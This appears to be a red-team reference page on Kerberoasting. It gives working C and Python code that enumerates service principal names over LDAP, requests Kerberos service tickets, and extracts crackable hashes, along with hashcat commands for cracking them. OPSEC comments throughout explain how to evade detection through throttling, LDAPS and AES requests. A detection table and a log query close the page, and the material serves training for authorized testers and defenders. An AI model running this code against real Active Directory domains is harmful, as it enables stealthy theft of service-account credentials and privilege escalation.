# Kerberoasting Implementation

**MITRE ATT&CK**: [T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Kerberoasting exploits the Kerberos TGS exchange to obtain service tickets encrypted
with a service account's password hash. Any authenticated domain user can request a
TGS for any SPN, then extract the encrypted portion and crack it offline without
generating failed-logon events. The value is highest against service accounts with
weak passwords and elevated privileges (SQL, IIS app pools, etc.).

## Kerberos TGS-REQ Flow

```
 Attacker (any domain user)              KDC (Domain Controller)
 ============================            ========================
          |                                        |
          |  1. LDAP: find SPNs                    |
          |  (&(servicePrincipalName=*)            |
          |    (objectCategory=person))            |
          |--------------------------------------->|
          |  2. LDAP response: SPN list            |
          |<---------------------------------------|
          |  3. TGS-REQ for each SPN               |
          |  (includes TGT in AP-REQ)              |
          |--------------------------------------->|
          |  4. TGS-REP: service ticket            |
          |  encrypted with service account's key  |
          |<---------------------------------------|
          |  5. Extract enc-part -> offline crack   |
```

## TGS-REP Ticket Structure

```
TGS-REP ::= {
    pvno     INTEGER (5),
    msg-type INTEGER (13),          -- KRB_TGS_REP
    ticket   Ticket {
        sname    PrincipalName,     -- the SPN
        enc-part EncryptedData {
            etype  INTEGER,         -- 23 = RC4-HMAC, 18 = AES256
            cipher OCTET STRING     -- THIS is what we crack
        }
    },
    enc-part EncryptedData { ... }  -- session key (not needed)
}
```

## RC4 vs AES256 Downgrade Significance

| Property | RC4-HMAC (etype 23) | AES256-CTS (etype 18) |
|---|---|---|
| Key derivation | Raw NTLM hash | PBKDF2(password, 4096 iterations) |
| Crack speed | ~200 GH/s on modern GPU | ~200 KH/s on modern GPU |
| Hashcat mode | 13100 | 19700 |
| Detection signal | Strong (0x17 in 4769) | Weak (normal etype) |

## SPN Enumeration via LDAP (C)

```c
/*
 * DETECTION: LDAP SPN queries logged if diagnostics enabled (Event 2889
 * for unsigned binds). High-volume SPN queries from a workstation are anomalous.
 * OPSEC: Use LDAP signing, spread queries over time, filter adminCount=1.
 */
#include <windows.h>
#include <winldap.h>
#include <stdio.h>
#pragma comment(lib, "wldap32.lib")

/* Targeted: only SPNs on accounts with adminCount=1
 * Reduces footprint and focuses on valuable targets.
 * adminCount persists even after privilege removal -- acceptable false positives. */
#define SPN_FILTER L"(&(servicePrincipalName=*)(objectCategory=person)" \
                   L"(objectClass=user)(adminCount=1))"

int enumerate_spns(const wchar_t *domain_controller) {
    LDAP *ld = NULL;
    LDAPMessage *result = NULL, *entry = NULL;
    PWCHAR attrs[] = { L"samAccountName", L"servicePrincipalName",
                       L"pwdLastSet", NULL };

    /* OPSEC: LDAPS (port 636) avoids content inspection on the wire */
    ld = ldap_sslinit((PWCHAR)domain_controller, LDAP_SSL_PORT, 1);
    if (!ld) return -1;

    /* Implicit SSPI bind -- uses current token, no extra creds needed */
    if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        ldap_unbind(ld);
        return -1;
    }

    /* DETECTION: This search is the primary indicator -- a single host
     * querying all SPNs is unusual in LDAP audit logs (not default). */
    if (ldap_search_s(ld, NULL, LDAP_SCOPE_SUBTREE,
                      SPN_FILTER, attrs, 0, &result) != LDAP_SUCCESS) {
        ldap_unbind(ld);
        return -1;
    }

    for (entry = ldap_first_entry(ld, result); entry;
         entry = ldap_next_entry(ld, entry)) {
        PWCHAR *spns = ldap_get_values(ld, entry, L"servicePrincipalName");
        if (spns) {
            for (ULONG i = 0; spns[i]; i++)
                wprintf(L"  SPN: %s\n", spns[i]);
            ldap_value_free(spns);
        }
    }
    ldap_msgfree(result);
    ldap_unbind(ld);
    return 0;
}
```

## TGS-REQ via SSPI (C)

```c
/*
 * DETECTION: Each call generates Event 4769. Etype 0x17 = RC4 downgrade.
 * OPSEC: Space requests over minutes. Avoid honeypot SPNs. Consider AES.
 */
#include <windows.h>
#include <security.h>
#pragma comment(lib, "secur32.lib")

int request_service_ticket(const char *spn) {
    CredHandle cred; CtxtHandle ctx; TimeStamp expiry; ULONG ctx_attr;
    SecBufferDesc out_desc; SecBuffer out_buf;

    /* OPSEC: Uses current logon session's TGT -- normal SSPI behavior */
    AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND,
                              NULL, NULL, NULL, NULL, &cred, &expiry);

    out_buf.cbBuffer = 65536;
    out_buf.BufferType = SECBUFFER_TOKEN;
    out_buf.pvBuffer = malloc(out_buf.cbBuffer);
    out_desc.ulVersion = SECBUFFER_VERSION;
    out_desc.cBuffers = 1;
    out_desc.pBuffers = &out_buf;

    /* DETECTION: This triggers Event 4769 on the DC.
     * The SPN maps to the ServiceName field in the event. */
    SECURITY_STATUS ss = InitializeSecurityContextA(
        &cred, NULL, (char *)spn, ISC_REQ_ALLOCATE_MEMORY,
        0, SECURITY_NATIVE_DREP, NULL, 0,
        &ctx, &out_desc, &ctx_attr, &expiry);

    if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) {
        printf("[+] Got TGS for %s (%lu bytes)\n", spn, out_buf.cbBuffer);
        /* Parse AP-REQ -> Ticket -> enc-part for hashcat format */
    }
    free(out_buf.pvBuffer);
    FreeCredentialsHandle(&cred);
    DeleteSecurityContext(&ctx);
    return 0;
}
```

## Python: Impacket-Style Kerberoasting

```python
"""
DETECTION: LDAP SPN queries in audit logs; Event 4769 per TGS-REQ;
  RC4 etype 23 is the strongest signal; rapid TGS-REQs from one IP.
OPSEC: Use AES for stealth; throttle requests; target high-value SPNs only.
"""
import ldap3, time
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, seq_set
from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT

def enumerate_spns(dc_ip, domain, username, password):
    """OPSEC: LDAPS prevents network inspection. adminCount=1 reduces footprint."""
    server = ldap3.Server(dc_ip, port=636, use_ssl=True)
    conn = ldap3.Connection(server, user=f"{domain}\\{username}",
                            password=password, authentication=ldap3.NTLM)
    conn.bind()
    conn.search(
        search_base=f"DC={domain.replace('.', ',DC=')}",
        search_filter="(&(servicePrincipalName=*)(objectCategory=person)"
                      "(objectClass=user)(adminCount=1))",
        attributes=["samAccountName", "servicePrincipalName", "pwdLastSet"])
    targets = []
    for entry in conn.entries:
        for spn in entry.servicePrincipalName.values:
            targets.append({"sam": str(entry.samAccountName), "spn": str(spn),
                            "pwdLastSet": entry.pwdLastSet.value})
    conn.unbind()
    return targets

def request_tgs(tgt, cipher, session_key, spn, domain):
    """DETECTION: Event 4769 per request. RC4 (etype 23) = 0x17 signal.
    OPSEC: Use etype [18] for AES -- ~1000x slower crack but no downgrade alert."""
    tgs, tgs_cipher, _, _ = sendReceive(
        tgt, cipher, session_key, domain, spn,
        etype=[constants.EncryptionTypes.rc4_hmac.value])  # 23
    return tgs, tgs_cipher

def extract_ticket_hash(tgs_data, spn, domain, username):
    """Local parsing only -- no additional events generated."""
    tgs_rep = TGS_REP(tgs_data)
    etype = tgs_rep["ticket"]["enc-part"]["etype"]
    cipher = tgs_rep["ticket"]["enc-part"]["cipher"].asOctets()
    if etype == 23:  # RC4: hashcat mode 13100
        return f"$krb5tgs$23$*{username}${domain}${spn}*${cipher[:16].hex()}${cipher[16:].hex()}"
    elif etype == 18:  # AES256: hashcat mode 19700
        return f"$krb5tgs$18$*{username}${domain}${spn}*${cipher[-12:].hex()}${cipher[:-12].hex()}"
    return None

def kerberoast(dc_ip, domain, username, password):
    """Full flow: TGT -> enumerate SPNs -> TGS per SPN -> extract hashes."""
    tgt, cipher, _, session_key = getKerberosTGT(username, password, domain, dc_ip)
    targets = enumerate_spns(dc_ip, domain, username, password)
    hashes = []
    for t in targets:
        time.sleep(3)  # OPSEC: throttle to mimic normal service access
        try:
            tgs, _ = request_tgs(tgt, cipher, session_key, t["spn"], domain)
            h = extract_ticket_hash(tgs, t["spn"], domain, t["sam"])
            if h:
                hashes.append(h)
                print(f"[+] Got hash for {t['sam']} ({t['spn']})")
        except Exception as e:
            print(f"[-] Failed for {t['spn']}: {e}")
    return hashes
```

## Hashcat Cracking Reference

```
hashcat -m 13100 -a 0 hashes.txt wordlist.txt -r rules/best64.rule   # RC4
hashcat -m 19700 -a 0 hashes.txt wordlist.txt -r rules/best64.rule   # AES256

# Format: $krb5tgs$23$*sqlsvc$CORP.LOCAL$MSSQLSvc/db01:1433*$checksum$edata2
```

## Detection Indicators

| Indicator | Source | Details |
|---|---|---|
| Event 4769 | Security log (DC) | Ticket Encryption Type = 0x17 (RC4) |
| Volume anomaly | Security log (DC) | Multiple 4769 from same Client Address in short window |
| LDAP SPN query | LDAP audit (DC) | Filter `servicePrincipalName=*` from non-admin workstation |
| RC4 downgrade | Event 4769 | Etype 0x17 when policy should enforce AES |
| Honeypot SPN | Custom | Ticket requested for a fake SPN with no legitimate use |
| Network signature | IDS/NDR | TGS-REQ with etype list containing only RC4 (23) |

```
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17
| stats count by Client_Address, Service_Name | where count > 5
```

## Cross-References

- [Kerberos Attacks Narrative](../../12-active-directory-deep-dive/kerberos-attacks.md) -- full Kerberos exchange walkthrough
- [AS-REP Roasting](asrep-roasting.md) -- related technique for accounts without pre-auth
- [Credential Access Overview](../../12-active-directory-deep-dive/credential-access.md) -- broader credential theft context
